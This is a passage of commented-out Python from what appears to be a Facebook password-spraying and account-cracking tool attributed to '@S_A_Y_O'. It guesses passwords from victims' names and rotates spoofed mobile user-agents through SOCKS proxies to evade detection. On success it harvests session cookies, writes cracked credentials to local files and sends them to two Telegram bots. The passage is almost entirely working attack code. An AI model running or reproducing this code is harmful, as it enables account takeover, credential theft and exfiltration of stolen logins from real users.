#        fn = names.split(' ')[0]
#        try:
#            ln = names.split(' ')[1]
#        except:
#            ln = fn
#        for pw in passlist:
#            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
#            ios_version = random.choice(['10_0_2', '10_1_1', '10_2', '10_2_1', '10_3_1', '10_3_2', '10_3_3'])
#            android_version = f'Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}'
#            facebook_version = f'{random.randint(10, 437)}.0.0.{random.randint(1, 99)}.{random.randint(1, 200)}'
#            fbbv = str(random.randint(10000000, 99999999))
#            fbsv = f'{random.uniform(4.0, 10.0):.1f}'
#            density = random.choice(['2.0', '2.25', '2.75', '3.0', '3.25', '3.75'])
#            width = random.randint(720, 1440)
#            height = random.randint(1080, 2560)
#            fblc = random.choice(['ja_JP', 'ex_MX', 'en_CU', 'en_US', 'fr_FR', 'fa_IR', 'es_ES', 'pt_BR', 'de_DE', 'it_IT', 'ja_JP', 'ko_KR', 'ru_RU', 'zh_CN', 'ar_AE', 'en_GB'])
#            fbcr = random.choice(['Telenor', 'fido', 'MOVO AFRICA', 'UFONE-PAKTel', 'Zong', 'Jazz', 'SCO', 'Jio', 'Vodafone', 'Airtel', 'BSNL', 'MTNL', 'Grameenphone', 'Robi', 'Banglalink', 'Teletalk', 'Telkomsel', 'Indosat Ooredoo', 'Axiata', 'Tri', 'Smartfren', 'China Mobile', 'Unicom', 'Telecom', 'Satcom', 'Docomo', 'Rakuten', 'IIJmio', 'Orange', 'Verizon', 'AT&T', 'T-Mobile', 'Sprint', 'Vodafone', 'Telefonica', 'EE', 'Orange', 'Three'])
#            fban = random.choice(['FB4A', 'FB5A', 'FB6A'])
#            fbpn = random.choice(['com.facebook.katana', 'com.facebook.orca', 'messenger-android', 'com.facebook.lite'])
#            pryx = random.choice(prox)
#            proxies = {'http': 'socks4://' + pryx}
#            ua = f'[FBAN/FB4A;FBAV/{random.randint(49, 66)}.0.0.{random.randrange(20, 49)}{random.randint(11, 99)};FBBV/{random.randint(11111111, 77777777)};[FBAN/FB4A;FBAV/83.0.0.20.71;FBBV/32723414;FBDM/{{density=1.5,width=480,height=800}};FBLC/ar_AR;FBCR/KOREK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9060I;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]\',\'[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880433;FBDM/{{density=1.5,width=480,height=800}};FBLC/es_LA;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G316M;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]\',\'[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022659;FBDM/{{density=1.5,width=540,height=960}};FBLC/es_LA;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531H;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]\',\'[FBAN/FB4A;FBAV/82.0.0.23.70;FBBV/32429830;FBDM/{{density=1.5,width=540,height=960}};FBLC/fr_FR;FBCR/MTN-CG;FBMF/HOTWAV;FBBD/HOTWAV;FBPN/com.facebook.katana;FBDV/Venus X1;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]\',\'[FBAN/FB4A;FBAV/82.0.0.20.70;FBBV/32367061;FBDM/{{density=1.5,width=854,height=480}};FBLC/es_LA;FBCR/OUI;FBMF/LAVA;FBBD/Lava;FBPN/com.facebook.katana;FBDV/iris702;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]\']'
#            device_id = str(uuid.uuid4())
#            adid = str(uuid.uuid4())
#            data = {
#                'adid': adid,
#                'email': ids,
#                'password': pas,
#                'cpl': 'true',
#                'credentials_type': 'device_based_login_password',
#                'source': 'device_based_login',
#                'error_detail_type': 'button_with_disabled',
#                'format': 'json',
#                'generate_session_cookies': '1',
#                'generate_analytics_claim': '1',
#                'generate_machine_id': '1',
#                'family_device_id': str(uuid.uuid4()),
#                'advertiser_id': str(uuid.uuid4()),
#                'locale': 'fr_DZ',
#                'client_country_code': 'DZ',
#                'device_id': str(uuid.uuid4()),
#                'method': 'auth.login',
#                'api_key': '882a8490361da98702bf97a021ddc14d',
#                'fb_api_req_friendly_name': 'authenticate',
#                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'
#            }
#            head = {
#                'content-type': 'application/x-www-form-urlencoded',
#                'Host': 'graph.facebook.com',
#                'x-fb-sim-hni': str(random.randint(20000, 40000)),
#                'X-FB-Connection-Type': 'MOBILE.LTE',
#                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
#                'user-agent': ua,
#                'x-fb-net-hni': str(random.randint(20000, 40000)),
#                'x-fb-device-group': '5120',
#                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
#                'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
#                'x-fb-connection-quality': 'EXCELLENT',
#                'X-FB-Client-IP': 'True',
#                'X-FB-Server-Cluster': 'True',
#                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
#                'x-fb-friendly-name': 'ViewerReactionsMutation',
#                'X-FB-Request-Analytics-Tags': 'graphservice',
#                'accept-encoding': 'gzip, deflate',
#                'x-fb-http-engine': 'Liger'
#            }
#            url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
#            po = requests.post(url, data=data, headers=head, proxies=proxies, allow_redirects=False).text
#            q = json.loads(po)
#            if 'session_key' in q:
#                ckkk = ';'.join((i['name'] + '=' + i['value'] for i in q['session_cookies']))
#                ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
#                cookie = f'sb={ssbb};{ckkk}'
#                print(f'''\n{gre} • 𝙽𝚎𝚠 𝙾𝚔 ✔︎
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙴𝚖𝚊𝚒𝚕 » {ids}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 » {pas}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙲𝚛𝚎𝚊𝚝 » {creat(ids)}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙱𝚈 » @S_A_Y_O''')
#                OKA = f''' • 𝙽𝚎𝚠 𝙾𝚔 ✔︎
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙴𝚞𝚜𝚊𝚒𝚕 » {ids}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 » {pas}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙲𝚛𝚎𝚊𝚝 » {creat(ids)}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙱𝚈 » @S_A_Y_O'''
#                requests.post(f"https://api.telegram.org/bot{str(token)}/sendMessage?chat_id={str(ID)}&text={str(OKA)}")
#                requests.post(f"https://api.telegram.org/bot{str(token2)}/sendMessage?chat_id={str(ID2)}&text={str(OKA)}")
#                open('/sdcard/𝗦𝗔𝗬𝗢-𝗢𝗞.txt', 'a').write(ids + '|' + pas + '\n')
#                open('/sdcard/SAYO-COOKiE.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
#                oks.append(ids)
#            else:
#                if 'www.facebook.com' in q.get('error', {}).get('message', '') and 'y' in q['error']['message']:
#                    if pcp:
#                        print(f'''\n{r} • 𝙽𝚎𝚠 𝙲𝚙 ✘
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙴𝚞𝚜𝚊𝚒𝚕 » {ids}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 » {pas}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙲𝚛𝚎𝚊𝚝 » {creat(ids)}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙱𝚈 » @S_A_Y_O''')
#                        CPA = f''' • 𝙽𝚎𝚠 𝙲𝚙 ✘
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙴𝚞𝚜𝚊𝚒𝚝 » {ids}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 » {pas}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙲𝚛𝚎𝚊𝚝 » {creat(ids)}
# ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
# • 𝙱𝚈 » @S_A_Y_O'''
#                        requests.post(f"https://api.telegram.org/bot{str(token)}/sendMessage?chat_id={str(ID)}&text={str(CPA)}")
#                        requests.post(f"https://api.telegram.org/bot{str(token2)}/sendMessage?chat_id={str(ID2)}&text={str(CPA)}")
#                    else:
#                        open('/sdcard/𝗦𝗔𝗬𝗢-𝗖𝗣.txt', 'a').write(ids + '|' + pas + '\n')
#                else:
#                    continue
#        loop += 1
#    except requests.exceptions.ConnectionError:
#        time.sleep(10)
#    except Exception as e:
#        pass
#def toasl():
#	
#	os.system("xdg-open https://t.me/S_A_Y_O")
#	menu()
#menu()
